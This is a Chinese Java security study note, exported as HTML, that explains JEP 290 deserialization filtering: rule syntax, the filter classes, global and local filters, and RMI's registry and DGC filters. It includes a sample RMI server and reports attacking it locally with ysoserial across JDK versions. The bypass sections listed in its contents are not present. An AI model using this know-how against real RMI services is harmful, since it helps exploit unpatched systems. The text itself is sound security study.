<!DOCTYPE html>
<html>
<head>
<title>Java安全学习-JEP290.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-jep290">Java安全学习-JEP290</h1>
<p>作者: H3rmesk1t@D1no</p>
<!-- vscode-markdown-toc -->
<ul>
<li>
<ol>
<li><a href="#">简介</a></li>
</ol>
</li>
<li>
<ol start="2">
<li><a href="#JEP290">JEP290实际限制</a></li>
</ol>
</li>
<li>
<ol start="3">
<li><a href="#-1">核心类</a></li>
</ol>
<ul>
<li>3.1. <a href="#ObjectInputStream">ObjectInputStream 类</a>
<ul>
<li>3.1.1. <a href="#-1">构造函数</a></li>
<li>3.1.2. <a href="#serialFilter">serialFilter 属性</a></li>
<li>3.1.3. <a href="#filterCheck">filterCheck 函数</a></li>
</ul>
</li>
<li>3.2. <a href="#ObjectInputFilter">ObjectInputFilter 接口</a></li>
<li>3.3. <a href="#Config">Config 静态类</a>
<ul>
<li>3.3.1. <a href="#createFilte">createFilte 方法</a></li>
<li>3.3.2. <a href="#getSerialFilter">getSerialFilter 方法</a></li>
</ul>
</li>
<li>3.4. <a href="#Global">Global 静态类</a>
<ul>
<li>3.4.1. <a href="#-1">构造函数</a></li>
<li>3.4.2. <a href="#filters">filters 字段</a></li>
<li>3.4.3. <a href="#checkInput">checkInput 方法</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="4">
<li><a href="#-1">过滤器</a></li>
</ol>
<ul>
<li>4.1. <a href="#-1">全局过滤器</a>
<ul>
<li>4.1.1. <a href="#jdk.serailFilter">jdk.serailFilter</a></li>
</ul>
</li>
<li>4.2. <a href="#-1">局部过滤器</a></li>
</ul>
</li>
<li>
<ol start="5">
<li><a href="#RMI">RMI 过滤机制</a></li>
</ol>
<ul>
<li>5.1. <a href="#RegistryImplJEP290">RegistryImpl 对象与 JEP290</a></li>
<li>5.2. <a href="#DGCImplJEP290">DGCImpl 对象与 JEP290</a></li>
<li>5.3. <a href="#JVM">通过 JVM 参数或者配置文件进行配置</a>
<ul>
<li>5.3.1. <a href="#RegistryImpl">RegistryImpl</a></li>
<li>5.3.2. <a href="#DGCImpl">DGCImpl</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="6">
<li><a href="#RMI-JEP290">RMI-JEP290 绕过</a></li>
</ol>
<ul>
<li>6.1. <a href="#u1218u230">8u121~8u230</a>
<ul>
<li>6.1.1. <a href="#UnicastRef">UnicastRef 类</a></li>
<li>6.1.2. <a href="#RemoteObject">RemoteObject 类</a></li>
<li>6.1.3. <a href="#ByPass">ByPass</a></li>
<li>6.1.4. <a href="#Demo">Demo</a></li>
<li>6.1.5. <a href="#-1">修复</a></li>
</ul>
</li>
<li>6.2. <a href="#u2318u240">8u231~8u240</a>
<ul>
<li>6.2.1. <a href="#Gadget">Gadget 分析</a></li>
<li>6.2.2. <a href="#Demo-1">Demo</a></li>
<li>6.2.3. <a href="#-1">修复</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="7">
<li><a href="#-1">参考</a></li>
</ol>
</li>
<li>
<ol start="8">
<li><a href="#-1">工具</a></li>
</ol>
</li>
</ul>
<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->
<h2 id="1-a-namea%E7%AE%80%E4%BB%8B">1. <a name=''></a>简介</h2>
<p><code>JEP 290</code>是<code>Java</code>底层为了缓解反序列化攻击提出的一种解决方案, 理想状态是让开发者只反序列化其想反序列化的类, 这样使用类似<code>CC链</code>这样的, 就会因为无法反序列化<code>Tranformer</code>、<code>HashMap</code>等, 从而没法触发漏洞.</p>
<p><a href="http://openjdk.java.net/jeps/290">官方描述</a></p>
<p><img src="./images/1.png" alt="JEP290官方描述"></p>
<p><code>JEP 290</code>主要描述了如下几个机制:</p>
<ul>
<li>Provide a flexible mechanism to narrow the classes that can be deserialized from any class available to an application down to a context-appropriate set of classes. (提供一个限制反序列化类的机制,白名单或者黑名单)</li>
<li>Provide metrics to the filter for graph size and complexity during deserialization to validate normal graph behaviors. (限制反序列化深度和复杂度)</li>
<li>Provide a mechanism for RMI-exported objects to validate the classes expected in invocations. (为 RMI 导出的对象设置了验证机制)</li>
<li>The filter mechanism must not require subclassing or modification to existing subclasses of ObjectInputStream. (过滤机制不得要求对 ObjectInputStream 的现有子类进行子类化或修改)</li>
<li>Define a global filter that can be configured by properties or a configuration file. (定义一个可配置的过滤机制, 比如可以通过配置properties文件的形式来定义过滤器)</li>
</ul>
<p><code>JEP 290</code>过滤规则如下:</p>
<ul>
<li>如果模式以&quot; !&quot;开头, 如果模式的其余部分匹配, 则该类被拒绝, 否则被接受.</li>
<li>如果模式包含&quot;/&quot;, 则&quot;/&quot;之前的非空前缀是模块名称. 如果模块名称与类的模块名称匹配, 则剩余模式与类名称匹配. 如果没有&quot;/&quot;, 则不比较模块名称.</li>
<li>如果模式以&quot; .**&quot;结尾, 则它匹配包和所有子包中的任何类</li>
<li>如果模式以&quot; .*&quot;结尾, 则它匹配包中的任何类</li>
<li>如果模式以&quot; *&quot;结尾, 它匹配任何以该模式为前缀的类.</li>
<li>如果模式等于类名, 则匹配.</li>
<li>否则状态未定.</li>
</ul>
<p><img src="./images/15.png" alt="Process-wide Filter"></p>
<p><code>JEP 290</code>在<code>JDK 9</code>中加入, 但在<code>JDK 6,7,8</code>一些高版本中也添加了, 具体为<code>JDK 8u121</code>、<code>JDK 7u131</code>和<code>JDK 6u141</code>. <a href="https://blogs.oracle.com/java-platform-group/filter-incoming-serialization-data-a-little-of-jdk-9-goodness-available-now-in-current-release-families">官方说明</a></p>
<p><img src="./images/2.png" alt="JEP 290添加在JDK678"></p>
<h2 id="2-a-namejep290ajep290%E5%AE%9E%E9%99%85%E9%99%90%E5%88%B6">2. <a name='JEP290'></a>JEP290实际限制</h2>
<p>这里用<code>8u311</code>和<code>8u66</code>来做比较, 示例代码如下:</p>
<ul>
<li>RMIServer.java</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290;

<span class="hljs-keyword">import</span> java.rmi.Naming;
<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/1/30 7:52 下午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIServer</span> </span>{

    <span class="hljs-comment">// 参数配置</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String HOST = <span class="hljs-string">"localhost"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> PORT = <span class="hljs-number">8888</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String RMI_PATH = <span class="hljs-string">"/demo"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String RMI_NAME = <span class="hljs-string">"rmi://"</span> + HOST + <span class="hljs-string">":"</span> + PORT + RMI_PATH;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 注册RMI端口</span>
            LocateRegistry.createRegistry(PORT);

            <span class="hljs-comment">// 创建一个服务</span>
            RemoteImpl remoteImpl = <span class="hljs-keyword">new</span> RemoteImpl();

            <span class="hljs-comment">// 服务命名绑定</span>
            Naming.bind(RMI_NAME, remoteImpl);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
    }
}
</div></code></pre>
<ul>
<li>RemoteImpl.java</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290;

<span class="hljs-keyword">import</span> java.rmi.RemoteException;
<span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/1/30 7:53 下午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RemoteImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RemoteInterface</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">RemoteImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>{
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">demo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello, h3rmesk1t!"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">demo</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> RemoteException </span>{
        <span class="hljs-keyword">return</span> object.getClass().getName();
    }
}
</div></code></pre>
<ul>
<li>RemoteInterface.java</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290;

<span class="hljs-keyword">import</span> java.rmi.Remote;
<span class="hljs-keyword">import</span> java.rmi.RemoteException;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/1/30 7:53 下午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Remote</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">demo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException</span>;

    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">demo</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> RemoteException</span>;
}
</div></code></pre>
<p>利用<code>ysoserial</code>项目中的<code>ysoserial.exploit.RMIRegistryExploit</code>来进行攻击, 可以发现当<code>jdk8</code>版本大于<code>8u121</code>时来启动<code>RMIServer</code>, 会显示攻击失败; 而低于<code>8u121</code>时, 则可以成功攻击, 弹出计算器.</p>
<p><img src="images/4.png" alt="8u311"></p>
<p><img src="./images/5.png" alt="8u66"></p>
<h2 id="3-a-name-1a%E6%A0%B8%E5%BF%83%E7%B1%BB">3. <a name='-1'></a>核心类</h2>
<p><code>JEP 290</code>涉及的核心类有: <code>ObjectInputStream</code>类, <code>ObjectInputFilter</code>接口, <code>Config</code>静态类以及<code>Global</code>静态类. 其中<code>Config</code>类是<code>ObjectInputFilter</code>接口的内部类, <code>Global</code>类又是<code>Config</code>类的内部类.</p>
<h3 id="31-a-nameobjectinputstreamaobjectinputstream-%E7%B1%BB">3.1. <a name='ObjectInputStream'></a>ObjectInputStream 类</h3>
<p>跟进之前测试时的报错信息, 跟进<code>java.io.ObjectInputStream</code>类, <code>JEP 290</code>进行过滤的具体实现方法是在<code>ObjectInputStream</code>类中增加了一个<code>serialFilter</code>属性和一个<code>filterChcek</code>函数, 两者搭配来实现过滤.</p>
<h4 id="311-a-name-1a%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">3.1.1. <a name='-1'></a>构造函数</h4>
<p>在<code>ObjectInputStream</code>类中含有两个构造函数, 需要注意的是, 在这两个构造函数中都会给属性<code>serialFilter</code>赋值为<code>Config.getSerialFilterFactorySingleton().apply(null, Config.getSerialFilter())</code>.</p>
<p><img src="./images/6.png" alt="serialFilter"></p>
<p>跟进<code>Config.getSerialFilter()</code>, 可以看到<code>ObjectInputFilter.Config.getSerialFilter()</code>返回<code>ObjectInputFilter#Config</code>静态类中的<code>serialFilter</code>静态字段.</p>
<p><img src="./images/7.png" alt="getSerialFilter"></p>
<h4 id="312-a-nameserialfilteraserialfilter-%E5%B1%9E%E6%80%A7">3.1.2. <a name='serialFilter'></a>serialFilter 属性</h4>
<p><code>serialFilter</code>属性是一个<code>ObjectInputFilter</code>接口类型, 并且这个接口声明了一个<code>checkInput</code>方法.</p>
<p><img src="./images/8.png" alt="serialFilter"></p>
<p><img src="./images/9.png" alt="checkInput"></p>
<h4 id="313-a-namefiltercheckafiltercheck-%E5%87%BD%E6%95%B0">3.1.3. <a name='filterCheck'></a>filterCheck 函数</h4>
<p>在<code>filterCheck</code>函数中, 函数逻辑流程大致可以分为三步:</p>
<ol>
<li>先判断<code>serialFilter</code>的属性值是否为<code>null</code>, 当不为<code>null</code>时则会进行过滤操作.</li>
<li>当判断<code>serialFilter</code>的属性值不为<code>null</code>后, 创建一个<code>FilterValues</code>对象, 并把需要检查的信息封装进去, 再调用<code>serialFilter.checkInput</code>方法进行判断, 并返回<code>ObjectInputFilter.Status</code>类型的返回值</li>
<li>根据返回值进行判断, 当返回值为<code>null</code>或<code>ObjectInputFilter.Status.REJECTED</code>时会抛出异常.</li>
</ol>
<p><img src="./images/10.png" alt="filterCheck"></p>
<h3 id="32-a-nameobjectinputfilteraobjectinputfilter-%E6%8E%A5%E5%8F%A3">3.2. <a name='ObjectInputFilter'></a>ObjectInputFilter 接口</h3>
<p>该接口是<code>JEP 290</code>中实现过滤操作的一个最基础的接口, 在低于<code>JDK 9</code>的时候的全限定名是<code>sun.misc.ObjectInputFIlter</code>, <code>JDK 9</code>及以上是<code>java.io.ObjectInputFilter</code>. <code>ObjectInputFilter</code>接口的结构大致分为<code>checkInput</code>函数、<code>Config</code>静态类、<code>FilterInfo</code>接口、<code>Status</code>枚举类.</p>
<p><img src="./images/11.png" alt="ObjectInputFilter"></p>
<h3 id="33-a-nameconfigaconfig-%E9%9D%99%E6%80%81%E7%B1%BB">3.3. <a name='Config'></a>Config 静态类</h3>
<p><code>Config</code>静态类是<code>ObjcectInputFilter</code>接口的一个内部静态类. 在初始化时, 会将<code>Config.serialFilter</code>赋值为一个<code>Global</code>对象, 而<code>ObjectInputStream</code>的构造函数中取的就是<code> Config.serialFilter</code>这个静态字段, 所以设置了<code>Config.serialFilter</code>这个静态字段就相当于设置了<code>ObjectInputStream</code>类全局过滤器.</p>
<p><img src="./images/12.png" alt="Config"></p>
<p>这里可以通过配置<code>JVM</code>的<code>jdk.serialFilter</code>或者<code>%JAVA_HOME%\conf\security\java.security</code>文件的<code>jdk.serialFilter</code>字段值, 来设置<code>Config.serialFilter</code>, 也是设置了全局过滤. 另外还有就是一些框架, 在开始的时候设置也会设置<code>Config.serialFilter</code>, 来设置<code>ObjectInputStream</code>类的全局过滤, 例如<code>weblogic</code>在启动的时候会设置<code>Config.serialFilter</code>为<code>WebLogicObjectInputFilterWrapper</code>对象.</p>
<h4 id="331-a-namecreatefilteacreatefilte-%E6%96%B9%E6%B3%95">3.3.1. <a name='createFilte'></a>createFilte 方法</h4>
<p><code>Config#createFilter</code>会进一步调用<code>Global.createFilter</code>方法, 主要功能就是将传入的<code>JEP 290</code>规则字符串解析到<code>Global</code>对象的<code>filters</code>字段上, 并且返回这个<code>Global</code>对象.</p>
<p><img src="./images/13.png" alt="createFilter"></p>
<h4 id="332-a-namegetserialfilteragetserialfilter-%E6%96%B9%E6%B3%95">3.3.2. <a name='getSerialFilter'></a>getSerialFilter 方法</h4>
<p><code>Config#getSerialFilter</code>主要功能就是返回<code>Config#serialFilter</code>的字段值.</p>
<p><img src="./images/14.png" alt="getSerialFilter"></p>
<h3 id="34-a-nameglobalaglobal-%E9%9D%99%E6%80%81%E7%B1%BB">3.4. <a name='Global'></a>Global 静态类</h3>
<p><code>Global</code>静态类是<code>Config</code>类中的一个内部静态类, 其重要特征是实现了<code>ObjectInputFilter</code>接口中的<code>checkInput</code>方法. 所以<code>Global</code>类可以直接赋值到<code>ObjectInputStream.serialFilter</code>上.</p>
<h4 id="341-a-name-1a%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">3.4.1. <a name='-1'></a>构造函数</h4>
<p><code>Global</code>中的构造函数会解析<code>JEP 290</code>规则为对应的<code>lambda</code>表达式, 然后添加到<code>Global.filters</code>.</p>
<p><img src="./images/16.png" alt="global"></p>
<h4 id="342-a-namefiltersafilters-%E5%AD%97%E6%AE%B5">3.4.2. <a name='filters'></a>filters 字段</h4>
<p><code>filters</code>字段作为一个函数列表, 用来后续过滤操作.</p>
<h4 id="343-a-namecheckinputacheckinput-%E6%96%B9%E6%B3%95">3.4.3. <a name='checkInput'></a>checkInput 方法</h4>
<p><code>checkInput</code>方法会遍历<code>filters</code>来检测要反序列化的类.</p>
<p><img src="./images/9.png" alt="checkInput"></p>
<h2 id="4-a-name-1a%E8%BF%87%E6%BB%A4%E5%99%A8">4. <a name='-1'></a>过滤器</h2>
<p>在核心类中的<code>ObjectInputStream</code>类中说过, 配置过滤器其实就是设置<code>ObjectInputStream</code>类中的<code>serialFilter</code>属性. 根据上文提到的过滤配置规则也不难看出过滤器的类型有两种:</p>
<ol>
<li>通过配置文件或者<code>JVM</code>属性来配置的全局过滤器.</li>
<li>通过改变<code>ObjectInputStream</code>的<code>serialFilter</code>属性来配置的局部过滤器.</li>
</ol>
<h3 id="41-a-name-1a%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8">4.1. <a name='-1'></a>全局过滤器</h3>
<p>全局过滤器实际上就是通过设置<code>Config</code>静态类中的<code>serialFilter</code>静态字段值来进行过滤. 上文中也提到了在<code>ObjectInputStream</code>的两个构造方法中都会<code>serialFilter</code>属性赋值<code>Config.getSerialFilterFactorySingleton().apply(null, Config.getSerialFilter())</code>, 通过调用链可以知道最后返回的是<code>Config#serialFilter</code>.</p>
<h4 id="411-a-namejdkserailfilterajdkserailfilter">4.1.1. <a name='jdk.serailFilter'></a>jdk.serailFilter</h4>
<p>上文中提到了<code>Config</code>静态类初始化的时候会解析<code>jdk.serailFilter</code>属性设置的<code>JEP 290</code>规则到一个<code>Global</code>对象的<code>filters</code>属性, 并且会将这个<code>Global</code>对象赋值到<code>Config</code>静态类的<code>serialFilter</code>属性上. 因此, <code>Config.serialFilter</code>值默认是解析<code>jdk.serailFilter</code>属性得到得到的<code>Global</code>对象.</p>
<h3 id="42-a-name-1a%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8">4.2. <a name='-1'></a>局部过滤器</h3>
<p>局部过滤器实际上是在<code>new objectInputStream</code>对象之后通过改变单个<code>ObjectInputStream</code>对象的<code>serialFilter</code>字段值来实现局部过滤, 通常有两种方法来达到该目的:</p>
<ul>
<li>通过调用<code>ObjectInputStream</code>对象的<code>setInternalObjectInputFilter</code>方法(低于<code>JDK 9</code>的时候是<code>getInternalObjectInputFilter</code>和<code>setInternalObjectInputFilter</code>, <code>JDK 9</code>以及以上是<code>getObjectInputFilter</code>和<code>setObjectInputFIlter</code>).</li>
</ul>
<p><img src="./images/17.png" alt="ObjectInputStream#setInternalObjectInputFilter"></p>
<ul>
<li>通过调用<code>Config</code>静态类的<code>setObjectInputFIlter</code>方法.</li>
</ul>
<p><img src="./images/18.png" alt="Config#setObjectInputFIlter"></p>
<h2 id="5-a-namermiarmi-%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6">5. <a name='RMI'></a>RMI 过滤机制</h2>
<p>在<code>RMI</code>中采用的是局部过滤的机制, 对于<code>RMI</code>的学习具体可以看看之前的<a href="https://github.com/H3rmesk1t/Learning_summary/blob/main/2022-1-19/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-RMI%E5%AD%A6%E4%B9%A0.md#">Java安全学习-RMI学习</a>或者<a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">官方文档</a></p>
<h3 id="51-a-nameregistryimpljep290aregistryimpl-%E5%AF%B9%E8%B1%A1%E4%B8%8E-jep290">5.1. <a name='RegistryImplJEP290'></a>RegistryImpl 对象与 JEP290</h3>
<p><code>RegistryImpl</code>作为一个特殊的对象, 导出在<code>RMI</code>服务端, 客户端调用的<code>bind</code>、<code>lookup</code>、<code>list</code>等操作, 实际上是操作<code>RegistryImpl</code>的<code>bindings</code>这个<code>Hashtable</code>. <code>RegistryImpl</code>特殊在导出过程中生成的<code>Target</code>对象是一个&quot;定制&quot;的<code>Target</code>对象, 具体体现在:</p>
<ul>
<li><code>Target</code>中<code>id</code>的<code>objNum</code>是固定的, 为<code>ObjID.REGISTRY_ID</code>, 也就是<code>0</code>.</li>
<li><code>Target</code>中<code>disp</code>是<code>filter</code>为<code>RegisryImpl::RegistryFilter</code>, <code>skel</code>为<code>RegsitryImpl_skel</code>的<code>UnicastServerRef</code>对象.</li>
<li><code>Target</code>中<code>stub</code>为<code>RegistryImpl_stub</code>.</li>
</ul>
<p><img src="./images/19.png" alt="bindings"></p>
<h3 id="52-a-namedgcimpljep290adgcimpl-%E5%AF%B9%E8%B1%A1%E4%B8%8E-jep290">5.2. <a name='DGCImplJEP290'></a>DGCImpl 对象与 JEP290</h3>
<p><code>DGCImpl</code>对象和<code>RegistryImpl</code>对象类似都是一个特殊的对象, 其<code>Target</code>对象的特殊体现在:</p>
<ul>
<li><code>Target</code>中<code>id</code>的<code>objNum</code>是固定的, 为<code>ObjID.DGC_ID</code>, 也就是<code>2</code>.</li>
<li><code>Target</code>中<code>disp</code>是<code>filter</code>为<code>DGCImpl::DGCFilter</code>, <code>skel</code>为<code>DGCImpl_skel</code>的 <code>UnicastServerRef</code>对象.</li>
<li><code>Target</code>中<code>stub</code>为<code>DGC_stub</code>.</li>
</ul>
<h3 id="53-a-namejvma%E9%80%9A%E8%BF%87-jvm-%E5%8F%82%E6%95%B0%E6%88%96%E8%80%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E9%85%8D%E7%BD%AE">5.3. <a name='JVM'></a>通过 JVM 参数或者配置文件进行配置</h3>
<h4 id="531-a-nameregistryimplaregistryimpl">5.3.1. <a name='RegistryImpl'></a>RegistryImpl</h4>
<p><code>RegistryImpl</code>中含有一个静态字段<code>registryFilter</code>, 所以在<code>new RegistryImpl</code>对象的时候会调用<code>initRegistryFilter</code>方法进行赋值.</p>
<pre class="hljs"><code><div><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ObjectInputFilter registryFilter = (ObjectInputFilter)AccessController.doPrivileged(RegistryImpl::initRegistryFilter);
</div></code></pre>
